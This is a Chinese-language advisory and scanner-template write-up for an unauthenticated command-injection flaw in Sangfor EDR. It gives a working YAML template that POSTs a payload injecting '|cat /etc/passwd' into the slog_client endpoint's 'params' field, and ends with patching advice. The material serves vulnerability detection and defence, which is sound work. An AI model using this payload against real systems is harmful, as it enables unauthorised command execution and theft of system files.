### 深信服 EDR 远程命令执行漏洞

**模板文件**：`sangfor-edr-rce.yaml`

#### 漏洞简介

深信服 EDR（终端检测与响应）3.2.17R1/3.2.21 存在远程命令执行漏洞。攻击者无需认证即可通过特定接口传入恶意参数，远程执行任意系统命令，获取服务器敏感信息或控制系统。

#### 漏洞原理

该漏洞源于接口 `/api/edr/sangforinter/v2/cssp/slog_client` 对参数未做有效校验，攻击者可通过构造特殊的 POST 请求，将命令注入到 `params` 字段，服务端直接拼接并执行，导致命令执行。

#### 检测逻辑（YAML内容解析）

```yaml
id: sangfor-edr-rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
      - type: status
        status:
          - 200
```

- 发送包含命令注入 payload 的 POST 请求到目标接口。
- 若响应体中出现 `/etc/passwd` 文件内容（如 `root:.*:0:0:`），且状态码为 200，则判定存在命令执行漏洞。

#### 防护建议

- 升级深信服 EDR 至官方修复版本。
- 对接口参数进行严格校验，禁止拼接和执行外部命令。
- 加强接口权限控制，避免未授权访问敏感接口。

---